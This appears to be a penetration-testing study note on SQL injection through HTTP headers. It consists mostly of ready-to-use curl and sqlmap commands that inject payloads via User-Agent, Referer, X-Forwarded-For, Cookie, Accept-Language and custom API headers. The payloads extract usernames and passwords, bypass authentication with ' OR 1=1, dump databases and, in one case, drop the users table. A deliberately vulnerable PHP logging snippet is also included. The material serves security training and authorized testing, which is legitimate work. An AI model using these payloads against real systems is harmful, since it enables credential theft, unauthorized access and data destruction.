---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.11 SQLi in HTTP Headers (User-Agent, Cookie, Referer, X-Forwarded-For)"
---

# 06.11 — SQLi in HTTP Headers

## Why Headers Are Injection Points

Developers sometimes log or store HTTP headers in the database — for analytics, debugging, access control, or audit trails. When these stored values are later used in SQL queries without sanitization, header injection is possible.

```
COMMON HEADERS STORED IN DB:
  User-Agent   → logged for analytics ("what browser did users use?")
  Referer      → traffic source tracking
  X-Forwarded-For → IP logging for audit trail
  Cookie       → session tokens, user preferences
  Accept-Language → localization preferences
  Custom headers  → X-Custom-Header application-specific values

VULNERABLE CODE EXAMPLE:
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  // trusts user-supplied header!
  $ua = $_SERVER['HTTP_USER_AGENT'];
  $sql = "INSERT INTO logs (ip, user_agent) VALUES ('$ip', '$ua')";
  // → BOTH ip and ua are injectable!
```

---

## User-Agent Injection

```bash
# DETECT:
curl -H "User-Agent: test'" https://target.com/
# → SQL error? → User-Agent is stored in DB without sanitization!

# BOOLEAN TEST:
curl -H "User-Agent: test' AND '1'='1" https://target.com/
curl -H "User-Agent: test' AND '1'='2" https://target.com/
# Different responses → CONFIRMED!

# ERROR-BASED EXTRACTION:
curl -H "User-Agent: test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -" \
  https://target.com/

# TIME-BASED:
curl -s -w "Time: %{time_total}s\n" \
  -H "User-Agent: test' AND SLEEP(5)-- -" \
  -o /dev/null https://target.com/

# FULL DATA EXTRACTION:
curl -H "User-Agent: test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users)))-- -" \
  https://target.com/

# NOTE: "-- -" with trailing space is sometimes needed when comment has trailing '
```

---

## Referer Header Injection

```bash
# DETECT:
curl -H "Referer: https://google.com/'" https://target.com/
# → Error?

# BOOLEAN:
curl -H "Referer: https://google.com/' AND '1'='1" https://target.com/
curl -H "Referer: https://google.com/' AND '1'='2" https://target.com/

# TIME-BASED:
curl -s -w "Time: %{time_total}s\n" \
  -H "Referer: https://google.com/' AND SLEEP(5)-- -" \
  -o /dev/null https://target.com/

# EXTRACT:
curl -H "Referer: https://test.com/' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -" \
  https://target.com/
```

---

## X-Forwarded-For Injection

X-Forwarded-For is often trusted for IP logging — frequently injectable.

```bash
# DETECT:
curl -H "X-Forwarded-For: 127.0.0.1'" https://target.com/
# → Error? → Stored in DB!

# BOOLEAN:
curl -H "X-Forwarded-For: 127.0.0.1' AND '1'='1" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1' AND '1'='2" https://target.com/

# TIME-BASED:
curl -s -w "Time: %{time_total}s\n" \
  -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)-- -" \
  -o /dev/null https://target.com/

# EXTRACT DATABASE:
curl -H "X-Forwarded-For: 127.0.0.1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -" \
  https://target.com/

# EXTRACT USERS:
curl -H "X-Forwarded-For: 127.0.0.1' UNION SELECT username,password FROM users-- -" \
  https://target.com/
# (only works if this header's stored value is later displayed somewhere)
```

---

## Cookie Header Injection

Cookies are often used for authentication and preferences — injecting here can affect session-based queries.

```bash
# DETECT (session-based app):
# If application looks up user with: SELECT * FROM users WHERE session_id = 'COOKIE_VALUE'
curl -H "Cookie: session_id=abc'" https://target.com/profile
# → Error?

# BOOLEAN TEST ON SESSION:
curl -H "Cookie: session_id=abc' AND '1'='1" https://target.com/profile
curl -H "Cookie: session_id=abc' AND '1'='2" https://target.com/profile

# AUTHENTICATION BYPASS VIA COOKIE:
# If: SELECT * FROM users WHERE remember_me = 'COOKIE_VALUE'
curl -H "Cookie: remember_me=' OR 1=1 LIMIT 1--" https://target.com/

# PREFERENCE COOKIE:
curl -H "Cookie: lang=en'; DROP TABLE users;--" https://target.com/
# → If lang is used in: SELECT * FROM translations WHERE lang='LANG_VALUE'

# SQLMAP WITH COOKIE INJECTION:
sqlmap -u "https://target.com/profile" \
  --cookie="session=test" -p session

# FROM CAPTURED REQUEST:
# Save Burp request with cookie field to request.txt
sqlmap -r request.txt -p "session"
```

---

## Accept-Language Injection

```bash
# VULNERABLE CODE: SELECT content FROM pages WHERE lang='$accept_lang'
curl -H "Accept-Language: en'" https://target.com/
# → Error?

# BOOLEAN TEST:
curl -H "Accept-Language: en' AND '1'='1" https://target.com/
curl -H "Accept-Language: en' AND '1'='2" https://target.com/

# TIME-BASED:
curl -H "Accept-Language: en' AND SLEEP(5)-- -" https://target.com/ \
  -s -w "%{time_total}\n" -o /dev/null
```

---

## Custom Header Injection

```bash
# MODERN APIs OFTEN USE CUSTOM HEADERS:
# X-User-ID, X-Account-ID, X-Auth-Token, X-Api-Key, X-Request-ID

# IF APP USES HEADER IN SQL:
# SELECT * FROM users WHERE api_key = 'X-API-KEY-VALUE'

curl -H "X-Api-Key: valid_key'" https://target.com/api/data
# → Error?

# ANOTHER PATTERN (authorization bypass):
# SELECT * FROM resources WHERE user_id = 'X-USER-ID' AND resource = '...'
curl -H "X-User-ID: 1 OR 1=1-- -" https://target.com/api/resources
# → Returns ALL resources!
```

---

## SQLMap for Header Injection

```bash
# TEST SPECIFIC HEADER:
sqlmap -u "https://target.com/" \
  -H "User-Agent: test" \
  -p "User-Agent"

# TEST MULTIPLE HEADERS:
sqlmap -u "https://target.com/" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "User-Agent: Mozilla" \
  -H "Referer: https://google.com/" \
  --level=5  # level 5 tests all headers automatically!

# FROM BURP REQUEST WITH HEADERS:
# Modify the saved request file to mark injectable header:
# User-Agent: test*   ← asterisk marks injection point for sqlmap
sqlmap -r request.txt

# DUMP AFTER DETECTION:
sqlmap -u "https://target.com/" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -p "X-Forwarded-For" \
  --dbs --dump
```

---

## Finding Header Injection Candidates

```
INDICATORS THAT HEADERS ARE LOGGED:
  → Analytics pages showing browser/referrer data
  → Admin log pages showing IP addresses
  → "Last accessed from" in profile (shows IP)
  → Audit trails with browser information
  → A/B testing or feature flags based on headers
  → IP-based rate limiting or geo-restrictions
  → Any personalization based on Accept-Language

HOW TO TEST SYSTEMATICALLY:
  1. Send request with valid values → observe normal response
  2. Add ' to each header value one at a time
  3. Observe any change: error, behavior, response size
  4. If something changes → investigate further with boolean/time tests
  5. Use SQLMap --level=5 to test all common headers automatically
```

---

## Related Notes
- [[09 - SQLi in GET Parameters]] — GET-based injection
- [[10 - SQLi in POST Body]] — POST-based injection  
- [[14 - User-Agent header]] — User-Agent security context
- [[15 - Referer header]] — Referer security
- [[21 - sqlmap Full Usage Guide]] — automating header injection
